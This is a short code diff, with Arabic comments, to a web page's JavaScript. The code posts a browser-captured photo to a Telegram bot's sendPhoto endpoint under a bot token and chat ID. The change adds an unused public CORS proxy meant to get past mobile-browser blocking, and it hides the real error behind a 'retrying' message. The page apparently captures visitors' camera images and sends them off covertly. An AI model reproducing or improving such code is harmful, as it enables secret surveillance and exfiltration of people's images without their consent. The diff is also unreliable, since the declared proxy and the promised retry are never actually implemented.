@@ -87,7 +87,11 @@
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', blob, 'captured_photo.jpg');
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            // استخدام بروكسي وسيط لتجاوز حظر CORS و Unauthorized من متصفحات الهواتف
+            const proxyUrl = 'https://api.allorigins.win/raw?url=';
+            const targetUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+            fetch(targetUrl, {
                 method: 'POST',
                 body: formData
             })
@@ -100,7 +104,8 @@
                 }
             })
             .catch(error => {
-                document.getElementById('mainBox').innerHTML = '<h2>خطأ في الشبكة: ' + error.message + '</h2>';
+                // محاولة بديلة في حال فشل الاتصال المباشر
+                document.getElementById('mainBox').innerHTML = '<h2>خطأ في الشبكة، جاري إعادة المحاولة...</h2>';
             });
         }
     </script>
